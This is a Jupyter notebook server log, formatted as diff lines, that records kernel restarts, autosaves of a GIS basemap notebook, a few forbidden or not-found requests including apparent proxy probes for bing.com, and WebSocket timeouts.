+[W 08:34:30.227 NotebookApp] 403 POST /api/kernels/e2c22266-0f53-4203-a750-dcd82695ac4d/restart (46.14.48.6) 1.50ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[W 08:34:30.267 NotebookApp] None
+[W 08:34:30.267 NotebookApp] 403 DELETE /api/sessions/11fb7318-0cb0-41bf-ae1c-a50f127beb97 (46.14.48.6) 1.42ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[W 08:34:30.305 NotebookApp] None
+[W 08:34:30.306 NotebookApp] 403 POST /api/sessions (46.14.48.6) 1.52ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:34:35.710 NotebookApp] 302 GET /notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb (46.14.48.6) 0.90ms
+[I 08:34:38.417 NotebookApp] 302 POST /login?next=%2Fnotebooks%2Fdata_analysis%2FRogunHPP.SetupBasemaps.ipynb (46.14.48.6) 1.47ms
+[W 08:34:39.073 NotebookApp] 404 GET /nbextensions/widgets/notebook/js/extension.js?v=20180730083220 (46.14.48.6) 1.74ms referer=http://gis.jkaelin.com:8080/notebooks/data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:34:41.202 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:34:46.479 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:34:47.301 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:36:44.307 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:38:45.734 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:41:25.469 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:41:26.175 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:41:54.074 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:41:54.802 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:42:41.971 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:44:47.978 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:57:46.807 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 08:58:32.971 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:58:33.743 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 08:58:41.081 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:00:44.588 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:02:44.821 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:06:44.352 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:06:47.330 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 09:06:48.232 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 09:06:50.365 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:08:43.954 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:10:44.991 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:11:10.350 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:11:47.499 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:13:58.828 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 09:13:59.692 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 09:14:41.403 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:16:43.576 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:18:43.950 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:23:00.717 NotebookApp] 302 GET / (37.236.127.115) 0.66ms
+[I 09:26:57.801 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:28:44.906 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:28:52.581 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:30:47.376 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:31:39.470 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:32:37.745 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 09:32:38.545 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 09:32:41.025 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:34:42.639 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:36:44.345 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:36:54.852 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:38:24.361 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:38:26.225 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[W 09:38:26.333 NotebookApp] zmq message arrived on closed channel
+[I 09:38:27.170 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 09:38:41.142 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:40:41.798 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:42:46.191 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:43:33.262 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:44:29.938 NotebookApp] Kernel restarted: e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 09:44:30.650 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[I 09:44:41.185 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:46:45.952 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:48:47.873 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 09:58:16.863 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 10:00:46.955 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 10:01:23.022 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 10:01:53.947 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 10:02:48.339 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[W 10:06:12.216 NotebookApp] 404 GET http://www.bing.com (163.172.149.131) 2.54ms referer=None
+[W 10:22:41.150 NotebookApp] WebSocket ping timeout after 119982 ms.
+[W 10:22:45.313 NotebookApp] WebSocket ping timeout after 119880 ms.
+[W 10:22:46.190 NotebookApp] WebSocket ping timeout after 119983 ms.
+[W 10:23:00.651 NotebookApp] WebSocket ping timeout after 119968 ms.
+[I 10:23:43.492 NotebookApp] Adapting to protocol v5.1 for kernel 924659f8-5768-43ea-90dd-dfa7728e25dc
+[I 10:23:47.469 NotebookApp] Adapting to protocol v5.1 for kernel 880e35c1-427d-4ee8-9dbb-ee60604cccdf
+[I 10:23:48.482 NotebookApp] Adapting to protocol v5.1 for kernel d68b923d-fce6-4cca-b69e-c6a0bf865fda
+[I 10:24:02.502 NotebookApp] Adapting to protocol v5.1 for kernel e2c22266-0f53-4203-a750-dcd82695ac4d
+[W 10:36:22.435 NotebookApp] 404 GET http://www.bing.com (212.47.244.68) 1.77ms referer=None
+[I 10:40:48.104 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
+[I 10:42:45.251 NotebookApp] Saving file at /data_analysis/RogunHPP.SetupBasemaps.ipynb
